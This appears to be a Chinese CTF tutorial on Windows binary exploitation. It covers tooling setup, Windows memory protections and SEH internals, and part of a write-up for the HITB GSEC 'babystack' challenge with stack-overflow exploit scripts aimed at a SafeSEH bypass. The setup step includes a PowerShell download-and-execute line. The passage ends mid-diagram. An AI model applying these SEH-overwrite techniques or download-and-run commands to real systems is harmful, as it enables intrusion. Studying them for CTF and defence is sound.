> 原文链接: https://www.anquanke.com//post/id/210394 


# Windows Pwn 学习之路


                                阅读量   
                                **251073**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">5</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p3.ssl.qhimg.com/t01647c201be53d2718.png)](https://p3.ssl.qhimg.com/t01647c201be53d2718.png)



## 0x01 前言

近期的比赛中已经出现了很多和Windows pwn有关的题目，因此，本着学习的态度这里将总结我学习Windows Pwn中的学习历程。

本文主要介绍了`Windows Pwn`中环境的搭建以及一些新的机制，辅以部分例题帮助理解。



## 0x02 环境搭建

### <a class="reference-link" name="%E4%BC%98%E5%8C%96Powershell%E6%98%BE%E7%A4%BA"></a>优化Powershell显示

> 优化步骤使用<a>@Lulus</a>的知乎专栏

如果你不喜欢原有的`powershell`显示风格，你可以运行下列命令来更换其显示风格：

```
iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))
choco feature enable -n allowGlobalConfirmation
choco install git
Install-Module posh-git
Install-Module oh-my-posh
Install-Module -Name PSReadLine -Force -SkipPublisherCheck
Install-Module Get-ChildItemColor -AllowClobber
Install-Module WindowsConsoleFonts
if (!(Test-Path -Path $PROFILE )) `{` New-Item -Type File -Path $PROFILE -Force `}`
@"
#requires -Version 2 -Modules posh-git

function Write-Theme `{`
    param(
        [bool]
        `$lastCommandFailed,
        [string]
        `$with
    )

    `$lastColor = `$sl.Colors.PromptBackgroundColor
    `$prompt = Write-Prompt -Object `$sl.PromptSymbols.StartSymbol -ForegroundColor `$sl.Colors.PromptForegroundColor -BackgroundColor `$sl.Colors.SessionInfoBackgroundColor

    #check the last command state and indicate if failed
    If (`$lastCommandFailed) `{`
        `$prompt += Write-Prompt -Object "`$(`$sl.PromptSymbols.FailedCommandSymbol) " -ForegroundColor `$sl.Colors.CommandFailedIconForegroundColor -BackgroundColor `$sl.Colors.SessionInfoBackgroundColor
    `}`

    #check for elevated prompt
    If (Test-Administrator) `{`
        `$prompt += Write-Prompt -Object "`$(`$sl.PromptSymbols.ElevatedSymbol) " -ForegroundColor `$sl.Colors.AdminIconForegroundColor -BackgroundColor `$sl.Colors.SessionInfoBackgroundColor
    `}`

    `$user = [System.Environment]::UserName
    `$computer = [System.Environment]::MachineName
    `$path = Get-FullPath -dir `$pwd
    if (Test-NotDefaultUser(`$user)) `{`
        `$prompt += Write-Prompt -Object "`$user@`$computer " -ForegroundColor `$sl.Colors.SessionInfoForegroundColor -BackgroundColor `$sl.Colors.SessionInfoBackgroundColor
    `}`

    if (Test-VirtualEnv) `{`
        `$prompt += Write-Prompt -Object "`$(`$sl.PromptSymbols.SegmentForwardSymbol) " -ForegroundColor `$sl.Colors.SessionInfoBackgroundColor -BackgroundColor `$sl.Colors.VirtualEnvBackgroundColor
        `$prompt += Write-Prompt -Object "`$(`$sl.PromptSymbols.VirtualEnvSymbol) `$(Get-VirtualEnvName) " -ForegroundColor `$sl.Colors.VirtualEnvForegroundColor -BackgroundColor `$sl.Colors.VirtualEnvBackgroundColor
        `$prompt += Write-Prompt -Object "`$(`$sl.PromptSymbols.SegmentForwardSymbol) " -ForegroundColor `$sl.Colors.VirtualEnvBackgroundColor -BackgroundColor `$sl.Colors.PromptBackgroundColor
    `}`
    else `{`
        `$prompt += Write-Prompt -Object "`$(`$sl.PromptSymbols.SegmentForwardSymbol) " -ForegroundColor `$sl.Colors.SessionInfoBackgroundColor -BackgroundColor `$sl.Colors.PromptBackgroundColor
    `}`

    # Writes the drive portion
    `$prompt += Write-Prompt -Object "`$path " -ForegroundColor `$sl.Colors.PromptForegroundColor -BackgroundColor `$sl.Colors.PromptBackgroundColor

    `$status = Get-VCSStatus
    if (`$status) `{`
        `$themeInfo = Get-VcsInfo -status (`$status)
        `$lastColor = `$themeInfo.BackgroundColor
        `$prompt += Write-Prompt -Object `$(`$sl.PromptSymbols.SegmentForwardSymbol) -ForegroundColor `$sl.Colors.PromptBackgroundColor -BackgroundColor `$lastColor
        `$prompt += Write-Prompt -Object " `$(`$themeInfo.VcInfo) " -BackgroundColor `$lastColor -ForegroundColor `$sl.Colors.GitForegroundColor
    `}`

    # Writes the postfix to the prompt
    `$prompt += Write-Prompt -Object `$sl.PromptSymbols.SegmentForwardSymbol -ForegroundColor `$lastColor

    `$timeStamp = Get-Date -UFormat %r
    `$timestamp = "[`$timeStamp]"

    `$prompt += Set-CursorForRightBlockWrite -textLength (`$timestamp.Length + 1)
    `$prompt += Write-Prompt `$timeStamp -ForegroundColor `$sl.Colors.PromptForegroundColor

    `$prompt += Set-Newline

    if (`$with) `{`
        `$prompt += Write-Prompt -Object "`$(`$with.ToUpper()) " -BackgroundColor `$sl.Colors.WithBackgroundColor -ForegroundColor `$sl.Colors.WithForegroundColor
    `}`
    `$prompt += Write-Prompt -Object (`$sl.PromptSymbols.PromptIndicator) -ForegroundColor `$sl.Colors.PromptBackgroundColor
    `$prompt += ' '
    `$prompt
`}`

`$sl = `$global:ThemeSettings #local settings
`$sl.PromptSymbols.StartSymbol = ''
`$sl.PromptSymbols.PromptIndicator = [char]::ConvertFromUtf32(0x276F)
`$sl.PromptSymbols.SegmentForwardSymbol = [char]::ConvertFromUtf32(0xE0B0)
`$sl.Colors.PromptForegroundColor = [ConsoleColor]::White
`$sl.Colors.PromptSymbolColor = [ConsoleColor]::White
`$sl.Colors.PromptHighlightColor = [ConsoleColor]::DarkBlue
`$sl.Colors.GitForegroundColor = [ConsoleColor]::Black
`$sl.Colors.WithForegroundColor = [ConsoleColor]::DarkRed
`$sl.Colors.WithBackgroundColor = [ConsoleColor]::Magenta
`$sl.Colors.VirtualEnvBackgroundColor = [System.ConsoleColor]::Red
`$sl.Colors.VirtualEnvForegroundColor = [System.ConsoleColor]::White
"@&gt;"C:Program FilesWindowsPowerShellModulesoh-my-posh2.0.443ThemesParadox.psm1"
@"
chcp 65001
Set-PSReadlineOption -EditMode Emacs
function which(`$name) `{` Get-Command `$name | Select-Object Definition `}`
function rmrf(`$item) `{` Remove-Item `$item -Recurse -Force `}`
function mkfile(`$file) `{` "" | Out-File `$file -Encoding ASCII `}`
Import-Module posh-git
Import-Module oh-my-posh
Import-Module Get-ChildItemColor
Import-Module WindowsConsoleFonts
Set-Alias l Get-ChildItemColor -option AllScope
Set-Alias ls Get-ChildItemColorFormatWide -option AllScope
Set-Theme Paradox
"@ &gt; $PROFILE
chcp 65001
Set-PSReadlineOption -EditMode Emacs
Import-Module posh-git
Import-Module oh-my-posh
Import-Module Get-ChildItemColor
Import-Module WindowsConsoleFonts
Set-Alias l Get-ChildItemColor -option AllScope
Set-Alias ls Get-ChildItemColorFormatWide -option AllScope
Set-Theme Paradox
git clone https://github.com/powerline/fonts.git
cd .fonts
.install.ps1
cd ..
del .fonts -Recurse -Force
```

**⚠️：`Line 92`需要修改为你的本地正确地址！**

在那之后，修改`Powershell -&gt; 首选项 -&gt; 字体`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-07-05-143201.png)

在那之后，修改`Powershell -&gt; 首选项 -&gt; 颜色 -&gt; 屏幕背景`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-07-05-143341.png)

### <a class="reference-link" name="%E9%85%8D%E7%BD%AEPython2%E4%BB%A5%E5%8F%8APython3%E7%8E%AF%E5%A2%83"></a>配置Python2以及Python3环境

配置方法及过程此处不再赘述，但是注意，若因为优化了`PowerShell`而导致了`LookupError: unknown encoding: cp65001`，则需要添加一个环境变量：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-07-05-155426.png)

### <a class="reference-link" name="%E5%AE%89%E8%A3%85winpwn"></a>安装winpwn

`winpwn`更类似于`pwntools`，用于本地的程序调试以及连接远程。

使用以下命令安装`winpwn`这个包，并且安装相关依赖：

```
pip install winpwn
pip install pefile
pip install keystone-engine
pip install capstone
```

### <a class="reference-link" name="%E5%AE%89%E8%A3%85winchecksec"></a>安装winchecksec

`winchecksec`更类似于`checksec`，用于`Windows`程序的保护检查。

使用以下命令安装`winchecksec`，并且安装相关依赖：

```
vcpkg install pe-parse:x86-windows
vcpkg install pe-parse:x64-windows
vcpkg install uthenticode:x86-windows
vcpkg install uthenticode:x64-windows
git clone https://github.com/trailofbits/winchecksec.git
cd winchecksec
mkdir build
cd build
cmake ..
cmake --build . --config Release
```

**⚠️注意：这里首先需要安装`vcpkg`作为核心依赖项**，可以使用如下方法安装：

```
git clone https://github.com/Microsoft/vcpkg.git
cd vcpkg
.vcpkg.exe integrate install
```

这里需要特别注意，如果在执行`.bootstrap-vcpkg.bat`时发生`error MSB8040: 此项目需要缓解了 Spectre 漏洞的库。从 Visual Studio 安装程序(单个组件选项卡)为正在使用的任何工具集和 体系结构安装它们。了解详细信息: https://aka.ms/Ofhn4`则需要打开`VisualStudio 2019 -&gt; 修改 -&gt; 单个组件`找到`编译器、生成工具和运行时`选项组，勾选安装**最新版本**的带`Spectre 漏洞`缓解的相关运行库。

[![](https://img.lhyerror404.cn/error404/2020-07-06-043928.png)](https://img.lhyerror404.cn/error404/2020-07-06-043928.png)

⚠️注意：使用`vcpkg`安装结束后需要进行环境变量的配置：

[![](https://img.lhyerror404.cn/error404/2020-07-06-071835.png)](https://img.lhyerror404.cn/error404/2020-07-06-071835.png)

### <a class="reference-link" name="%E9%85%8D%E7%BD%AE%E8%B0%83%E8%AF%95%E5%99%A8"></a>配置调试器

在`Windows`下，我们常用的调试器有：`x64dbg`、`Windbg(Windows 10)`、`gdb`、`WindbgX(Windbg Preview)`。
1. 对于`x64dbg`，直接从 [https://x64dbg.com/](https://x64dbg.com/) 下载即可。
<li>对于`Windbg(Windows 10)`，需要先安装`Windows SDK`(可通过`Visual Studio`来进行安装)，然后在应用和功能处修改添加。[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-07-07-083222.png)[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-07-07-083255.png)
</li>
1. 对于`GDB`，需要通过[`MinGW-w64`](https://sourceforge.net/projects/mingw-w64/)来进行安装。
1. 对于`WindbgX(Windbg Preview)`需要通过微软应用商店下载。
<li>对于以上所有的工具，为了能用`winpwntools`直接唤起，需要进行额外配置，首先下载[`Pykd-Ext`](https://github.com/hac425xxx/pykd-ext/releases/tag/pykd_ext_2.0.0.24)，需要注意的是，`Pykd-Ext`和`Pykd`是不同的两个插件。将下载下来的两个`dll`分别放置在正确的位置。在`$HOME`文件夹下建立文件`.winpwn`，内容如下：
<pre><code class="hljs json">`{`
    "debugger":`{`
        "i386": `{`
            "x64dbg": "C:\Program Files (x86)\x64debug\release\x32\x32dbg.exe", 
            "gdb": "", 
            "windbg": "C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\windbg.exe",
            "windbgx": "C:\Users\error404\AppData\Local\Microsoft\WindowsApps\Microsoft.WinDbg_8wekyb3d8bbwe\WinDbgX.exe"
        `}`,
        "amd64": `{`
            "x64dbg": "C:\Program Files (x86)\x64debug\release\x64\x64dbg.exe", 
            "gdb": "", 
            "windbg": "C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\windbg.exe",
            "windbgx": "C:\Users\error404\AppData\Local\Microsoft\WindowsApps\Microsoft.WinDbg_8wekyb3d8bbwe\WinDbgX.exe"
        `}`
    `}`,
    "debugger_init": `{`
        "i386": `{`
            "x64dbg": "", 
            "gdb": "", 
            "windbg": ".load C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\ext\pykd.dll;!py -g C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\ext\byinit.py;",
            "windbgx": ".load C:\Users\error404\AppData\Local\Microsoft\WindowsApps\Microsoft.WinDbg_8wekyb3d8bbwe\ext32\pykd.dll;!py -g C:\Users\error404\AppData\Local\Microsoft\WindowsApps\Microsoft.WinDbg_8wekyb3d8bbwe\ext32\byinit.py;"
        `}`,
        "amd64": `{`
            "x64dbg": "", 
            "gdb": "", 
            "windbg": ".load C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\ext\pykd.dll;!py -g C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\ext\byinit.py;",
            "windbgx": ".load C:\Users\error404\AppData\Local\Microsoft\WindowsApps\Microsoft.WinDbg_8wekyb3d8bbwe\ext64\pykd.dll;!py -g C:\Users\error404\AppData\Local\Microsoft\WindowsApps\Microsoft.WinDbg_8wekyb3d8bbwe\ext64\byinit.py;"
        `}`
    `}`
`}`
</code></pre>
⚠️：路径请自行调整。
</li>


## 0x03 Windows Pwn 基本知识

### <a class="reference-link" name="%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A"></a>函数调用约定
1. 由于函数调用约定大多只和架构相关，因此和`Linux`相比没有太大的变化。
### `Windows`程序保护

`Windows`下有部分程序保护更换了名字或者有一些细节发生了改变，我们来详细列举。
<li>
`ASLR`：与`Linux`相同，`ASLR`保护指的是地址随机化技术(`Address Space Layout Randomization`)，这项技术将在程序启动时将`DLL`随机的加载到内存中的位置，这将缓解恶意程序的加载。`ASLR`技术自`Windows 10`开始已经在系统中被配置为默认启用。[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-07-06-080736.jpg)
</li>
<li>
`High Entropy VA`：这个保护被称为高熵64位地址空间布局随机化，一旦开启，表示此程序的地址随机化的取值空间为`64 bit`，这会导致攻击者更难去推测随机化后的地址。</li>
<li>
`Force Integrity`：这个保护被称为强制签名保护，一旦开启，表示此程序加载时需要验证其中的签名，如果签名不正确，程序将会被阻止运行。</li>
<li>
`Isolation`：这个保护被称为隔离保护，一旦开启，表示此程序加载时将会在一个相对独立的隔离环境中被加载，从而阻止攻击者过度提升权限。</li>
<li>
`NX/DEP/PAE`：与`Linux`相同，`NX`保护指的是内存页不可运行(`No-eXecute`)，这项技术是一项系统级的内存保护功能，使操作系统能够将一页或多页内存标记为不可执行，从而防止从该内存区域运行代码，以帮助防止利用缓冲区溢出。它帮助防止代码在数据页面(例如堆，栈和内存池)中运行，在`Windows`中常称为`DEP`(数据执行保护，即`Data Execution Prevention`)，同时引入了一个新的机制被称为`PAE`(物理地址扩展，即`Physical Address Extension`)，`PAE`是一项处理器功能，使`x86`处理器可以在部分`Windows`版本上访问`4 GB`以上的物理内存。在基于`x86`的系统上运行的某些`32`位版本的`Windows Server`可以使用`PAE`访问最多`64 GB`或`128 GB`的物理内存，具体取决于处理器的物理地址大小。使用`PAE`，操作系统将从两级线性地址转换转换为三级地址转换。两级线性地址转换将线性地址拆分为三个独立的字段索引到内存表中，三级地址转换将其拆分为四个独立的字段：一个2位的字段，两个9位的字段和一个12位的字段。`PAE`模式下的页表条目(`PTE`)和页目录条目(`PDE`)的大小从32位增加到64位。附加位允许操作系统PTE或PDE引用4 GB以上的物理内存。同时，`PAE`将允许在基于`x64`的系统上运行的32位`Windows`中启用`DEP`等功能。</li>
<li>
`SEHOP`：即结构化异常处理保护(`Structured Exception Handling Overwrite Protection`)，这个保护能够防止攻击者利用结构化异常处理来进行进一步的利用。</li>
<li>
`CFG`：即控制流防护(`Control Flow Guard`)，这项技术通过在间接跳转前插入校验代码，检查目标地址的有效性，进而可以阻止执行流跳转到预期之外的地点， 最终及时并有效的进行异常处理，避免引发相关的安全问题。<br>
简单的说，就是在程序间接跳转之前，会判断这个将要跳转的地址是否是合法的。</li>
<li>
`RFG`：即返回地址防护(`Return Flow Guard`)，这项技术会在每个函数头部将返回地址保存到`fs:[rsp]`(`Thread Control Stack`)，并在函数返回前将其与栈上返回地址进行比较，从而有效阻止了这些攻击方式。</li>
<li>
`SafeSEH`：即安全结构化异常处理(`Safe Structured Exception Handlers`)，这项技术可以理解为一个白名单版的安全沙箱，它会事先为你定义一些异常处理程序，并基于此构造安全结构化异常处理表，程序正式运行后，安全结构化异常处理表之外的异常处理程序将会被阻止运行。</li>
<li>
`GS`：这个保护类似于`Linux`中的`Canary`保护，一旦开启，会在返回地址和`BP`之前压入一个额外的`Security Cookie`。系统会比较栈中的这个值和原先存放在`.data`中的值做一个比较。如果两者不吻合，说法栈中发生了溢出。</li>
<li>
`Authenticode`：签名保护。</li>
<li>
`.NET`：`DLL`混淆级保护。</li>
### 新机制——结构化异常处理(`SEH`机制)

结构化异常处理是`Windows`操作系统上`Microsoft`对`C/C++`程序语言做的语法扩展，用于处理异常事件的程序控制结构。异常事件是指打断程序正常执行流程的不在期望之中的硬件、软件事件。硬件异常是CPU抛出的如“除0”、数值溢出等；软件异常是操作系统与程序通过`RaiseException`语句抛出的异常。`Microsoft`扩展了C语言的语法，用`try-except`与`try-finally`语句来处理异常。异常处理程序可以释放已经获取的资源、显示出错信息与程序内部状态供调试、从错误中恢复、尝试重新执行出错的代码或者关闭程序等等。一个`__try`语句不能既有`__except`，又有`__finally`。但`try-except`与`try-finally`语句可以嵌套使用。

#### `SEH`相关的重要结构体

##### <a class="reference-link" name="TIB%E7%BB%93%E6%9E%84%E4%BD%93"></a>TIB结构体

`TIB`(`Thread Information Block`，线程信息块)是保存线程基本信息的数据结构，它存在于`x86`的机器上，它也被称为是`Win32`的`TEB`(`Thread Environment Block`，线程环境块)。`TIB/TEB`是操作系统为了保存每个线程的私有数据创建的，每个线程都有自己的`TIB/TEB`。

`TEB`结构位于`Windows.h`，内容如下：

```
typedef struct _TEB `{`
  PVOID Reserved1[12];
  PPEB  ProcessEnvironmentBlock;
  PVOID Reserved2[399];
  BYTE  Reserved3[1952];
  PVOID TlsSlots[64];
  BYTE  Reserved4[8];
  PVOID Reserved5[26];
  PVOID ReservedForOle;
  PVOID Reserved6[4];
  PVOID TlsExpansionSlots;
`}` TEB, *PTEB;
```

`TIB`没有在`Windows`文档中说明，这里从`Wine`中可以看到结构如下：

```
// Code in https://source.winehq.org/source/include/winnt.h#2635

typedef struct _NT_TIB`{`
    struct _EXCEPTION_REGISTRATION_RECORD *Exceptionlist; // 指向当前线程的 SEH
    PVOID StackBase;    // 当前线程所使用的栈的栈底
    PVOID StackLimit;   // 当前线程所使用的栈的栈顶
    PVOID SubSystemTib; // 子系统
    union `{`
        PVOID FiberData;
        ULONG Version;
    `}`;
    PVOID ArbitraryUserPointer;
    struct _NT_TIB *Self; //指向TIB结构自身
`}` NT_TIB;
```

在这个结构中与异常处理有关的成员是指向`_EXCEPTION_REGISTRATION_RECORD`结构的`Exceptionlist`指针

#### `_EXCEPTION_REGISTRATION_RECORD`结构体

该结构体主要用于描述线程异常处理句柄的地址，多个该结构的链表描述了多个线程异常处理过程的嵌套层次关系。

结构内容为：

```
//  Code in https://source.winehq.org/source/include/winnt.h#2623

typedef struct _EXCEPTION_REGISTRATION_RECORD`{`
    struct _EXCEPTION_REGISTRATION_RECORD *Next; // 指向下一个结构的指针
    PEXCEPTION_ROUTINE Handler; // 当前异常处理回调函数的地址
`}`EXCEPTION_REGISTRATION_RECORD;
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-07-08-013637.png)

### <a class="reference-link" name="%E6%96%B0%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94%E5%AF%BC%E5%85%A5%E8%A1%A8%E5%92%8C%E5%AF%BC%E5%87%BA%E8%A1%A8"></a>新机制——导入表和导出表

Windows程序没有延迟绑定机制自然也就没有`PLT/GOT`表，但是`Windows`程序显然也是要调用所谓的库函数的，`Windows`下的函数库是`DLL`文件，类似于`Unix`下的`libc`文件，程序调用库函数需要借助的就是导入表和导出表了。

导入表是`PE`数据组织中的一个很重要的组成部分，它是为实现代码重用而设置的。通过分析导入表数据，可以获得诸如`PE`文件的指令中调用了多少外来函数，以及这些外来函数都存在于哪些动态链接库里等信息。`Windows`加载器在运行`PE`时会将导入表中声明的动态链接库一并加载到进程的地址空间，并修正指令代码中调用的函数地址。在数据目录中一共有四种类型的数据与导入表数据有关： 导入表、导入函数地址表、绑定导入表、延迟加载导入表。

程序中，导入表的地址通常位于`.idata`段

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-07-11-060710.png)



## 0x04 以[HITB GSEC]BABYSTACK为例

### <a class="reference-link" name="%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%A3%80%E6%9F%A5"></a>程序保护检查

[![](https://img.lhyerror404.cn/error404/2020-07-06-152818.png)](https://img.lhyerror404.cn/error404/2020-07-06-152818.png)

### <a class="reference-link" name="%E7%A8%8B%E5%BA%8F%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"></a>程序漏洞分析

程序漏洞还是较为明显的：

[![](https://img.lhyerror404.cn/error404/2020-07-07-022039.png)](https://img.lhyerror404.cn/error404/2020-07-07-022039.png)

在`Line 34`中，我们向`choice`这个局部变量写入了`0x100`个字节，这会造成栈溢出漏洞.

同时我们事实上可以发现程序中预留了后门语句

[![](https://img.lhyerror404.cn/error404/2020-07-07-031810.png)](https://img.lhyerror404.cn/error404/2020-07-07-031810.png)

那么我们接下来只要能劫持`EIP`就能成功完成漏洞利用，程序开启了`GS`保护，因此我们无法直接劫持返回地址。

进一步分析`main`函数发现，程序在`main`中注册了一个异常处理函数，如果一个程序中注册了一个异常处理函数，那么当该函数运行发生异常时将会由该异常处理函数进行异常的捕获及处理。

[![](https://img.lhyerror404.cn/error404/2020-07-07-071525.png)](https://img.lhyerror404.cn/error404/2020-07-07-071525.png)

我们尝试使用`WinDbg`附加到此程序，然后尝试读`0`地址处的值。

[![](https://img.lhyerror404.cn/error404/2020-07-07-072527.png)](https://img.lhyerror404.cn/error404/2020-07-07-072527.png)

发现程序确实转而去调用注册了的`SEH`了，又发现，程序在压入`EBP`后，压入栈的第三个数即为`SEH`地址，恰好在我们的可控范围，于是我们可以依据此来控制执行流。

### <a class="reference-link" name="%E7%A8%8B%E5%BA%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"></a>程序漏洞利用

#### <a class="reference-link" name="%E6%8E%A7%E5%88%B6%E6%89%A7%E8%A1%8C%E6%B5%81"></a>控制执行流

首先我们来写一个不触发漏洞利用的交互EXP

```
Stack_address = get_address(sh=sh,info="[+] STACK ADDRESS IS ",start_string="stack address = 0x",end_string="x0A",int_mode=True)
PIE_address   = get_address(sh=sh,info="[+] PIE ADDRESS IS ",start_string="main address = 0x",end_string="x0A",offset=-0x10B0,int_mode=True)
sh.recvuntil('Do you want to know more?')
sh.sendline('noo')
payload = 'A' * 0x10
get_gdb(sh)
sh.sendline(payload)
sh.recvuntil('Do you want to know more?')
sh.sendline('yes')
sh.recvuntil('Where do you want to know')
sh.sendline('0')
sh.interactive()
```

[![](https://img.lhyerror404.cn/error404/2020-07-07-113223.png)](https://img.lhyerror404.cn/error404/2020-07-07-113223.png)

可以发现，异常正常被捕获，接下来，我们来写一个触发漏洞利用的交互EXP

```
Stack_address = get_address(sh=sh,info="[+] STACK ADDRESS IS ",start_string="stack address = 0x",end_string="x0A",int_mode=True)
PIE_address   = get_address(sh=sh,info="[+] PIE ADDRESS IS ",start_string="main address = 0x",end_string="x0A",offset=-0x10B0,int_mode=True)
sh.recvuntil('Do you want to know more?')
sh.sendline('noo')
payload = 'A' * 0x90 + p32(0xDEADBEEF)
get_gdb(sh)
sh.sendline(payload)
sh.recvuntil('Do you want to know more?')
sh.sendline('yes')
sh.recvuntil('Where do you want to know')
sh.sendline('0')
sh.interactive()
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-07-07-113026.png)

可以发现，原有的异常捕获函数将不再被运行。

#### `Safe-SEH`绕过

但我们注意到，尽管我们已经屏蔽了原有的`SEH`，但是，我们没有将流程劫持到`0xDEADBEEF`！

这是因为`Safe-SEH`的开启，导致不在`__safe_se_handler_table`中的`SEH`均不会被运行，那么就不限于`0xDEADBEEF`了，程序预留的后门必然也不是不合条件的`SEH`，那么我们接下来就要绕过`Safe-SEH`了。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-07-08-014517.png)

那么，我们来分析程序中注册的`__except_handler4`异常，由于`Windows`是不开源的系统，因此我们只能通过逆向的手段来去查看相关伪代码，相关代码存在于`MSVCRT.dll`。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-07-08-053707.png)

将代码进行简单的优化以及重命名可以得到以下伪代码：

```
int __cdecl _except_handler4_common(unsigned int *CookiePointer, void (__fastcall *CookieCheckFunction)(unsigned int), _EXCEPTION_RECORD *ExceptionRecord, _EXCEPTION_REGISTRATION_RECORD *EstablisherFrame, _CONTEXT *ContextRecord)
`{`

    ScopeTable = (_EH4_SCOPETABLE *)(*CookiePointer ^ EstablisherFrame + 8);

    ValidateLocalCookies(CookieCheckFunction, ScopeTable, &amp;EstablisherFrame + 16);
    __except_validate_context_record(ContextRecord);

    if ( ExceptionRecord-&gt;ExceptionFlags &amp; 0x66 )
    `{`
        ......
    `}`
    else
    `{`
        exceptionPointers.ExceptionRecord = ExceptionRecord;
        exceptionPointers.ContextRecord   = ContextRecord;
        tryLevel = *(_DWORD *)(EstablisherFrame + 12);
        *(_DWORD *)(EstablisherFrame - 4) = &amp;ExceptionPointers;

        if ( tryLevel != -2 )
        `{`
            do
            `{`
                v8 = tryLevel + 2 * (tryLevel + 2);
                filterFunc = *(&amp;ScopeTable-&gt;GSCookieOffset + v8);
                scopeTableRecord = &amp;ScopeTable-&gt;GSCookieOffset + v8;
                encloseingLevel = scopeTableRecord-&gt;EnclosingLevel;

                if ( filterFunc )
                `{`
                    // 调用 FilterFunc
                    filterFuncRet = _EH4_CallFilterFunc(filterFunc, EstablisherFrame + 2);
                    ......
                if ( filterFuncRet &gt; 0 )
                `{`
                    // 调用 HandlerFunc
                    _EH4_TransferToHandler(scopeTableRecord-&gt;HandlerFunc, v5);
                    ......
                `}`
            `}`
            else
            `{`
                ......
            `}`
            tryLevel = encloseingLevel;
        `}`while ( encloseingLevel != -2 );
        ......
        `}`
    `}`
......
`}`
```

分析可以发现，在`Line 32`处，程序实际执行了`filterFunc(EstablisherFrame + 2)`，那么，我们只需要控制`filterFunc`和`EstablisherFrame`这两个值事实上就可以控制执行流程了。

那么我们来看`SEH`的栈结构：

```
Scope Table
                                              +-------------------+
                                              |  GSCookieOffset   |
                                              +-------------------+
                                              | GSCookieXorOffset |
                                              +-------------------+
